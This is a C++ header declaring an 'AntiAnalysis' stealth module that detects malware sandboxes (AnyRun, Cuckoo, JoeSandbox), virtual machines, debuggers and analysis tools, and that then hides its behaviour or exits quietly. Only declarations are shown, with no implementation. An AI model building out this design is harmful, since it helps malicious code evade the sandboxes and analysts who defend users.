#pragma once
#include <diarna/compiler_port.hpp>
#include <cstdint>
#include <string>
#include <vector>
#include <functional>

namespace diarna::stealth {

enum class SandboxType { None, AnyRun, JoeSandbox, Cuckoo, VMRay, HybridAnalysis,
                          Sandboxie, VBox, VMware, QEMU, HyperV, Parallels,
                          UnknownVM, Debugger, WinDbg, x64dbg, OllyDbg, IDA };

struct AnalysisResult {
    bool is_sandboxed = false;
    bool is_virtualized = false;
    bool is_debugged = false;
    bool is_any_run = false;
    SandboxType sandbox_type = SandboxType::None;
    std::string sandbox_name;
    std::vector<std::string> detected_artifacts;
    std::vector<std::string> evasion_details;
    uint32_t confidence = 0; // 0-100
};

class AntiAnalysis {
public:
    static AntiAnalysis& instance();

    AnalysisResult full_scan();
    bool quick_check();

    bool is_any_run();
    bool is_debugger_present();
    bool is_virtual_machine();
    bool is_sandboxie();
    bool is_wine();
    bool is_cuckoo();
    bool is_process_hacker_present();
    bool is_wireshark_present();

    void behave_defensively();
    void exit_stealthy();

    void set_on_detection(std::function<void(SandboxType)> callback);

private:
    AntiAnalysis() = default;
    ~AntiAnalysis() = default;

    bool check_hardware_artifacts(AnalysisResult& r);
    bool check_processes(AnalysisResult& r);
    bool check_registry(AnalysisResult& r);
    bool check_filesystem(AnalysisResult& r);
    bool check_timing(AnalysisResult& r);
    bool check_memory(AnalysisResult& r);
    bool check_network(AnalysisResult& r);
    bool check_windows(AnalysisResult& r);
    bool check_debugger(AnalysisResult& r);
    bool check_any_run_specific(AnalysisResult& r);
    bool check_user_interaction(AnalysisResult& r);
    bool check_hooks(AnalysisResult& r);
    bool check_blacklisted_drivers(AnalysisResult& r);
    bool check_misc(AnalysisResult& r);

    bool check_cpuid_vm();
    bool check_rdtsc_skew();
    bool check_mac_vendor();
    bool check_disk_size();
    bool check_ram_size();
    bool check_cpu_cores();
    bool check_screen_resolution();
    bool check_mouse_movement();
    bool check_clipboard_content();
    bool check_uptime();
    bool check_recent_files();
    bool check_running_time();
    bool check_mutexes();
    bool check_username();
    bool check_hostname();
    bool check_dlls_loaded();
    bool check_parent_process();
    bool check_temperature();
    bool check_firmware_type();
    bool check_domain();
    bool check_language();
    bool check_timezone();
    bool check_power_caps();
    bool check_usb_devices();
    bool check_printer();
    bool check_com_ports();
    bool check_pipe_names();
    bool check_window_names();
    bool check_installed_software();
    bool check_browser_history();
    bool check_cpu_fan_speed();
    bool check_acpi_tables();
    bool check_smbios_data();
    bool check_dxgkrnl_vm();

    std::vector<std::string> known_sandbox_mutexes_;
    std::vector<std::string> known_sandbox_files_;
    std::vector<std::string> known_sandbox_registry_;
    std::vector<std::string> known_sandbox_processes_;
    std::vector<std::string> known_debugger_processes_;
    std::vector<std::string> known_analysis_dlls_;

    std::function<void(SandboxType)> on_detect_;
};

} // namespace diarna::stealth
